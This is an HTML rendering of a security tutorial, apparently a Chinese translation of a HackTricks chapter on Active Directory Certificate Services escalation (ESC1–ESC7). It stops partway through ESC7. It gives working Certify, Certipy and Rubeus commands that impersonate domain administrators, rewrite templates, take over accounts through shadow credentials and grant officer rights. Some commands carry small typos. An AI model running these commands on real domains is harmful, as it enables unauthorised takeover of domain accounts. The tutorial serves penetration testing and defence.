@@ -1,0 +1,718 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>AD CS Domain Escalation</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../highlight.css">
+        <link rel="stylesheet" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="ad-cs-domain-escalation"><a class="header" href="#ad-cs-domain-escalation">AD CS Domain Escalation</a></h1>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<p>{% embed url="https://websec.nl/" %}</p>
+<p><strong>这是关于升级技术部分的总结：</strong></p>
+<ul>
+<li><a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf</a></li>
+<li><a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7">https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7</a></li>
+<li><a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a></li>
+</ul>
+<h2 id="misconfigured-certificate-templates---esc1"><a class="header" href="#misconfigured-certificate-templates---esc1">Misconfigured Certificate Templates - ESC1</a></h2>
+<h3 id="explanation"><a class="header" href="#explanation">Explanation</a></h3>
+<h3 id="misconfigured-certificate-templates---esc1-explained"><a class="header" href="#misconfigured-certificate-templates---esc1-explained">Misconfigured Certificate Templates - ESC1 Explained</a></h3>
+<ul>
+<li><strong>企业 CA 授予低权限用户注册权。</strong></li>
+<li><strong>不需要经理批准。</strong></li>
+<li><strong>不需要授权人员的签名。</strong></li>
+<li><strong>证书模板上的安全描述符过于宽松，允许低权限用户获得注册权。</strong></li>
+<li><strong>证书模板配置了定义 EKU 的身份验证：</strong></li>
+<li>包含客户端身份验证 (OID 1.3.6.1.5.5.7.3.2)、PKINIT 客户端身份验证 (1.3.6.1.5.2.3.4)、智能卡登录 (OID 1.3.6.1.4.1.311.20.2.2)、任何目的 (OID 2.5.29.37.0) 或无 EKU (SubCA) 的扩展密钥使用 (EKU) 标识符。</li>
+<li><strong>模板允许请求者在证书签名请求 (CSR) 中包含 subjectAltName：</strong></li>
+<li>如果存在，Active Directory (AD) 优先考虑证书中的 subjectAltName (SAN) 进行身份验证。这意味着通过在 CSR 中指定 SAN，可以请求证书以冒充任何用户（例如，域管理员）。请求者是否可以指定 SAN 在证书模板的 AD 对象中通过 <code>mspki-certificate-name-flag</code> 属性指示。该属性是一个位掩码，存在 <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> 标志允许请求者指定 SAN。</li>
+</ul>
+<p>{% hint style="danger" %}
+上述配置允许低权限用户请求具有任何选择的 SAN 的证书，从而通过 Kerberos 或 SChannel 以任何域主体的身份进行身份验证。
+{% endhint %}</p>
+<p>此功能有时被启用以支持产品或部署服务的 HTTPS 或主机证书的即时生成，或由于缺乏理解。</p>
+<p>需要注意的是，使用此选项创建证书会触发警告，而当复制现有证书模板（例如，启用了 <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> 的 <code>WebServer</code> 模板）并修改以包含身份验证 OID 时则不会。</p>
+<h3 id="abuse"><a class="header" href="#abuse">Abuse</a></h3>
+<p>要<strong>查找易受攻击的证书模板</strong>，您可以运行：</p>
+<pre><code class="language-bash">Certify.exe find /vulnerable
+certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
+</code></pre>
+<p>要<strong>利用此漏洞冒充管理员</strong>，可以运行：</p>
+<pre><code class="language-bash">Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
+certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
+</code></pre>
+<p>然后您可以将生成的 <strong>证书转换为 <code>.pfx</code></strong> 格式，并再次使用 <strong>Rubeus 或 certipy</strong> 进行 <strong>身份验证</strong>：</p>
+<pre><code class="language-bash">Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
+certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
+</code></pre>
+<p>Windows二进制文件 "Certreq.exe" 和 "Certutil.exe" 可用于生成 PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee</p>
+<p>可以通过运行以下 LDAP 查询来枚举 AD Forest 配置架构中的证书模板，特别是那些不需要批准或签名、具有客户端身份验证或智能卡登录 EKU，并且启用了 <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> 标志的模板:</p>
+<pre><code>(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
+</code></pre>
+<h2 id="misconfigured-certificate-templates---esc2"><a class="header" href="#misconfigured-certificate-templates---esc2">Misconfigured Certificate Templates - ESC2</a></h2>
+<h3 id="explanation-1"><a class="header" href="#explanation-1">Explanation</a></h3>
+<p>第二个滥用场景是第一个场景的变体：</p>
+<ol>
+<li>企业 CA 授予低权限用户注册权限。</li>
+<li>禁用经理审批的要求。</li>
+<li>省略了授权签名的需要。</li>
+<li>证书模板上的安全描述符过于宽松，授予低权限用户证书注册权限。</li>
+<li><strong>证书模板被定义为包含任何目的 EKU 或没有 EKU。</strong></li>
+</ol>
+<p><strong>任何目的 EKU</strong> 允许攻击者以 <strong>任何目的</strong> 获取证书，包括客户端认证、服务器认证、代码签名等。可以使用与 <strong>ESC3</strong> 相同的 <strong>技术</strong> 来利用此场景。</p>
+<p>具有 <strong>无 EKU</strong> 的证书，作为下级 CA 证书，可以被用于 <strong>任何目的</strong>，并且 <strong>也可以用来签署新证书</strong>。因此，攻击者可以利用下级 CA 证书指定任意 EKU 或字段在新证书中。</p>
+<p>然而，如果下级 CA 未被 <strong><code>NTAuthCertificates</code></strong> 对象信任（这是默认设置），则为 <strong>域认证</strong> 创建的新证书将无法正常工作。尽管如此，攻击者仍然可以创建 <strong>具有任何 EKU</strong> 和任意证书值的新证书。这些证书可能会被 <strong>滥用</strong> 用于广泛的目的（例如，代码签名、服务器认证等），并可能对网络中其他应用程序（如 SAML、AD FS 或 IPSec）产生重大影响。</p>
+<p>要枚举与此场景匹配的模板，可以运行以下 LDAP 查询：</p>
+<pre><code>(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
+</code></pre>
+<h2 id="misconfigured-enrolment-agent-templates---esc3"><a class="header" href="#misconfigured-enrolment-agent-templates---esc3">Misconfigured Enrolment Agent Templates - ESC3</a></h2>
+<h3 id="explanation-2"><a class="header" href="#explanation-2">Explanation</a></h3>
+<p>这个场景与第一个和第二个场景类似，但<strong>利用</strong>了<strong>不同的 EKU</strong>（证书请求代理）和<strong>两个不同的模板</strong>（因此有两组要求），</p>
+<p><strong>证书请求代理 EKU</strong>（OID 1.3.6.1.4.1.311.20.2.1），在微软文档中称为<strong>Enrollment Agent</strong>，允许一个主体<strong>代表另一个用户</strong>进行<strong>证书注册</strong>。</p>
+<p><strong>“enrollment agent”<strong>在这样的</strong>模板</strong>中注册，并使用生成的<strong>证书代表其他用户共同签署 CSR</strong>。然后，它<strong>将</strong>共同签署的<strong>CSR</strong>发送到 CA，注册一个<strong>允许“代表注册”的模板</strong>，CA则响应一个<strong>属于“其他”用户的证书</strong>。</p>
+<p><strong>Requirements 1:</strong></p>
+<ul>
+<li>企业 CA 授予低权限用户注册权。</li>
+<li>省略了经理批准的要求。</li>
+<li>没有授权签名的要求。</li>
+<li>证书模板的安全描述符过于宽松，授予低权限用户注册权。</li>
+<li>证书模板包括证书请求代理 EKU，允许代表其他主体请求其他证书模板。</li>
+</ul>
+<p><strong>Requirements 2:</strong></p>
+<ul>
+<li>企业 CA 授予低权限用户注册权。</li>
+<li>经理批准被绕过。</li>
+<li>模板的架构版本为 1 或超过 2，并指定了需要证书请求代理 EKU 的应用程序策略发行要求。</li>
+<li>证书模板中定义的 EKU 允许域身份验证。</li>
+<li>CA 上未对注册代理应用限制。</li>
+</ul>
+<h3 id="abuse-1"><a class="header" href="#abuse-1">Abuse</a></h3>
+<p>您可以使用 <a href="https://github.com/GhostPack/Certify"><strong>Certify</strong></a> 或 <a href="https://github.com/ly4k/Certipy"><strong>Certipy</strong></a> 来利用此场景：</p>
+<pre><code class="language-bash"># Request an enrollment agent certificate
+Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
+certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'
+
+# Enrollment agent certificate to issue a certificate request on behalf of
+# another user to a template that allow for domain authentication
+Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
+certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
+
+# Use Rubeus with the certificate to authenticate as the other user
+Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
+</code></pre>
+<p>The <strong>用户</strong> who are allowed to <strong>获取</strong> an <strong>注册代理证书</strong>, the templates in which enrollment <strong>代理</strong> are permitted to enroll, and the <strong>账户</strong> on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the <code>certsrc.msc</code> <strong>管理单元</strong>, <strong>右键点击 CA</strong>, <strong>点击属性</strong>, and then <strong>导航</strong> to the “Enrollment Agents” tab.</p>
+<p>However, it is noted that the <strong>默认</strong> setting for CAs is to “<strong>不限制注册代理</strong>.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows <strong>所有人</strong> access to enroll in all templates as anyone.</p>
+<h2 id="vulnerable-certificate-template-access-control---esc4"><a class="header" href="#vulnerable-certificate-template-access-control---esc4">Vulnerable Certificate Template Access Control - ESC4</a></h2>
+<h3 id="解释"><a class="header" href="#解释"><strong>解释</strong></a></h3>
+<p>The <strong>安全描述符</strong> on <strong>证书模板</strong> defines the <strong>权限</strong> specific <strong>AD 实体</strong> possess concerning the template.</p>
+<p>Should an <strong>攻击者</strong> possess the requisite <strong>权限</strong> to <strong>更改</strong> a <strong>模板</strong> and <strong>建立</strong> any <strong>可利用的错误配置</strong> outlined in <strong>先前的部分</strong>, privilege escalation could be facilitated.</p>
+<p>Notable permissions applicable to certificate templates include:</p>
+<ul>
+<li><strong>所有者:</strong> Grants implicit control over the object, allowing for the modification of any attributes.</li>
+<li><strong>完全控制:</strong> Enables complete authority over the object, including the capability to alter any attributes.</li>
+<li><strong>写入所有者:</strong> Permits the alteration of the object's owner to a principal under the attacker's control.</li>
+<li><strong>写入 DACL:</strong> Allows for the adjustment of access controls, potentially granting an attacker FullControl.</li>
+<li><strong>写入属性:</strong> Authorizes the editing of any object properties.</li>
+</ul>
+<h3 id="滥用"><a class="header" href="#滥用">滥用</a></h3>
+<p>An example of a privesc like the previous one:</p>
+<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>
+<p>ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.</p>
+<p>As we can see in the path above, only <code>JOHNPC</code> has these privileges, but our user <code>JOHN</code> has the new <code>AddKeyCredentialLink</code> edge to <code>JOHNPC</code>. Since this technique is related to certificates, I have implemented this attack as well, which is known as <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">Shadow Credentials</a>. Here’s a little sneak peak of Certipy’s <code>shadow auto</code> command to retrieve the NT hash of the victim.</p>
+<pre><code class="language-bash">certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
+</code></pre>
+<p><strong>Certipy</strong> 可以通过单个命令覆盖证书模板的配置。默认情况下，Certipy 将覆盖配置，使其对 ESC1 <strong>易受攻击</strong>。我们还可以指定 <strong><code>-save-old</code> 参数以保存旧配置</strong>，这在我们攻击后 <strong>恢复</strong> 配置时将非常有用。</p>
+<pre><code class="language-bash"># Make template vuln to ESC1
+certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old
+
+# Exploit ESC1
+certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local
+
+# Restore config
+certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
+</code></pre>
+<h2 id="vulnerable-pki-object-access-control---esc5"><a class="header" href="#vulnerable-pki-object-access-control---esc5">Vulnerable PKI Object Access Control - ESC5</a></h2>
+<h3 id="explanation-3"><a class="header" href="#explanation-3">Explanation</a></h3>
+<p>广泛的基于ACL的关系网络，包括证书模板和证书颁发机构之外的多个对象，可能会影响整个AD CS系统的安全性。这些对象可能显著影响安全性，包括：</p>
+<ul>
+<li>CA服务器的AD计算机对象，可能通过S4U2Self或S4U2Proxy等机制被攻陷。</li>
+<li>CA服务器的RPC/DCOM服务器。</li>
+<li>特定容器路径<code>CN=Public Key Services,CN=Services,CN=Configuration,DC=&lt;DOMAIN&gt;,DC=&lt;COM&gt;</code>内的任何后代AD对象或容器。该路径包括但不限于证书模板容器、认证机构容器、NTAuthCertificates对象和注册服务容器等容器和对象。</li>
+</ul>
+<p>如果低权限攻击者设法控制这些关键组件中的任何一个，PKI系统的安全性可能会受到威胁。</p>
+<h2 id="editf_attributesubjectaltname2---esc6"><a class="header" href="#editf_attributesubjectaltname2---esc6">EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6</a></h2>
+<h3 id="explanation-4"><a class="header" href="#explanation-4">Explanation</a></h3>
+<p>在<a href="https://cqureacademy.com/blog/enhanced-key-usage"><strong>CQure Academy帖子</strong></a>中讨论的主题也涉及**<code>EDITF_ATTRIBUTESUBJECTALTNAME2</code><strong>标志的影响，如微软所述。当在认证机构（CA）上激活此配置时，允许在</strong>任何请求<strong>的</strong>主题备用名称<strong>中包含</strong>用户定义的值**，包括那些由Active Directory®构建的请求。因此，这一条款允许<strong>入侵者</strong>通过为域<strong>身份验证</strong>设置的<strong>任何模板</strong>进行注册——特别是那些对<strong>无特权</strong>用户注册开放的模板，如标准用户模板。结果，可以获得证书，使入侵者能够作为域管理员或<strong>域内的任何其他活动实体</strong>进行身份验证。</p>
+<p><strong>注意</strong>：通过<code>certreq.exe</code>中的<code>-attrib "SAN:"</code>参数将<strong>备用名称</strong>附加到证书签名请求（CSR）的方法（称为“名称值对”）与ESC1中SAN的利用策略存在<strong>对比</strong>。在这里，区别在于<strong>账户信息的封装方式</strong>——在证书属性中，而不是扩展中。</p>
+<h3 id="abuse-2"><a class="header" href="#abuse-2">Abuse</a></h3>
+<p>要验证该设置是否已激活，组织可以使用以下命令与<code>certutil.exe</code>：</p>
+<pre><code class="language-bash">certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
+</code></pre>
+<p>此操作本质上使用<strong>远程注册表访问</strong>，因此，另一种方法可能是：</p>
+<pre><code class="language-bash">reg.exe query \\&lt;CA_SERVER&gt;\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\&lt;CA_NAME&gt;\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
+</code></pre>
+<p>像 <a href="https://github.com/GhostPack/Certify"><strong>Certify</strong></a> 和 <a href="https://github.com/ly4k/Certipy"><strong>Certipy</strong></a> 这样的工具能够检测到这种错误配置并加以利用：</p>
+<pre><code class="language-bash"># Detect vulnerabilities, including this one
+Certify.exe find
+
+# Exploit vulnerability
+Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
+certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
+</code></pre>
+<p>要更改这些设置，假设拥有<strong>域管理员</strong>权限或同等权限，可以从任何工作站执行以下命令：</p>
+<pre><code class="language-bash">certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
+</code></pre>
+<p>要在您的环境中禁用此配置，可以使用以下命令删除标志：</p>
+<pre><code class="language-bash">certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
+</code></pre>
+<p>{% hint style="warning" %}
+在2022年5月的安全更新之后，新发行的<strong>证书</strong>将包含一个<strong>安全扩展</strong>，该扩展包含<strong>请求者的 <code>objectSid</code> 属性</strong>。对于ESC1，此SID源自指定的SAN。然而，对于<strong>ESC6</strong>，SID反映<strong>请求者的 <code>objectSid</code></strong>，而不是SAN。<br />
+要利用ESC6，系统必须对ESC10（弱证书映射）敏感，该映射优先考虑<strong>SAN而不是新的安全扩展</strong>。
+{% endhint %}</p>
+<h2 id="易受攻击的证书颁发机构访问控制---esc7"><a class="header" href="#易受攻击的证书颁发机构访问控制---esc7">易受攻击的证书颁发机构访问控制 - ESC7</a></h2>
+<h3 id="攻击-1"><a class="header" href="#攻击-1">攻击 1</a></h3>
+<h4 id="解释-1"><a class="header" href="#解释-1">解释</a></h4>
+<p>证书颁发机构的访问控制通过一组权限来维护，这些权限管理CA的操作。可以通过访问<code>certsrv.msc</code>，右键单击CA，选择属性，然后导航到安全选项卡来查看这些权限。此外，可以使用PSPKI模块通过以下命令枚举权限：</p>
+<pre><code class="language-bash">Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
+</code></pre>
+<p>这提供了对主要权限的见解，即 <strong><code>ManageCA</code></strong> 和 <strong><code>ManageCertificates</code></strong>，分别与“CA管理员”和“证书管理器”的角色相关。</p>
+<h4 id="滥用-1"><a class="header" href="#滥用-1">滥用</a></h4>
+<p>在证书颁发机构拥有 <strong><code>ManageCA</code></strong> 权限使得主体能够使用 PSPKI 远程操控设置。这包括切换 <strong><code>EDITF_ATTRIBUTESUBJECTALTNAME2</code></strong> 标志，以允许在任何模板中指定 SAN，这是域提升的一个关键方面。</p>
+<p>通过使用 PSPKI 的 <strong>Enable-PolicyModuleFlag</strong> cmdlet，可以简化此过程，允许在不直接与 GUI 交互的情况下进行修改。</p>
+<p>拥有 <strong><code>ManageCertificates</code></strong> 权限可以批准待处理的请求，有效地绕过“CA 证书管理器批准”保护。</p>
+<p>可以结合 <strong>Certify</strong> 和 <strong>PSPKI</strong> 模块来请求、批准和下载证书：</p>
+<pre><code class="language-powershell"># Request a certificate that will require an approval
+Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
+[...]
+[*] CA Response      : The certificate is still pending.
+[*] Request ID       : 336
+[...]
+
+# Use PSPKI module to approve the request
+Import-Module PSPKI
+Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest
+
+# Download the certificate
+Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
+</code></pre>
+<h3 id="attack-2"><a class="header" href="#attack-2">Attack 2</a></h3>
+<h4 id="explanation-5"><a class="header" href="#explanation-5">Explanation</a></h4>
+<p>{% hint style="warning" %}
+在<strong>之前的攻击</strong>中，<strong><code>Manage CA</code></strong> 权限被用来<strong>启用</strong> <strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong> 标志以执行 <strong>ESC6 攻击</strong>，但这在 CA 服务（<code>CertSvc</code>）重启之前不会产生任何效果。当用户拥有 <code>Manage CA</code> 访问权限时，用户也被允许<strong>重启服务</strong>。然而，这<strong>并不意味着用户可以远程重启服务</strong>。此外，由于 2022 年 5 月的安全更新，<strong>ESC6 可能在大多数已修补的环境中无法正常工作</strong>。
+{% endhint %}</p>
+<p>因此，这里提出了另一个攻击。</p>
+<p>前提条件：</p>
+<ul>
+<li>仅有 <strong><code>ManageCA</code> 权限</strong></li>
+<li><strong><code>Manage Certificates</code></strong> 权限（可以从 <strong><code>ManageCA</code></strong> 授予）</li>
+<li>证书模板 <strong><code>SubCA</code></strong> 必须<strong>启用</strong>（可以从 <strong><code>ManageCA</code></strong> 启用）</li>
+</ul>
+<p>该技术依赖于拥有 <code>Manage CA</code> <em>和</em> <code>Manage Certificates</code> 访问权限的用户可以<strong>发出失败的证书请求</strong>。<strong><code>SubCA</code></strong> 证书模板<strong>易受 ESC1 攻击</strong>，但<strong>只有管理员</strong>可以注册该模板。因此，<strong>用户</strong>可以<strong>请求</strong>注册 <strong><code>SubCA</code></strong> - 这将被<strong>拒绝</strong> - 但<strong>随后由管理员发放</strong>。</p>
+<h4 id="abuse-3"><a class="header" href="#abuse-3">Abuse</a></h4>
+<p>您可以通过将自己用户添加为新官员来<strong>授予自己 <code>Manage Certificates</code></strong> 访问权限。</p>
+<pre><code class="language-bash">certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Successfully added officer 'John' on 'corp-DC-CA'
+</code></pre>
+<p><strong><code>SubCA</code></strong> 模板可以通过 <code>-enable-template</code> 参数在 CA 上 <strong>启用</strong>。默认情况下，<code>SubCA</code> 模板是启用的。</p>
+<pre><code class="language-bash"># List templates
+certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
+## If SubCA is not there, you need to enable it
+
+# Enable SubCA
+certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
+</code></pre>
+<p>如果我们满足了此攻击的先决条件，我们可以开始<strong>请求基于 <code>SubCA</code> 模板的证书</strong>。</p>
+<p><strong>此请求将被拒绝</strong>，但我们将保存私钥并记录请求 ID。</p>
+<pre><code class="language-bash">certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+[*] Request ID is 785
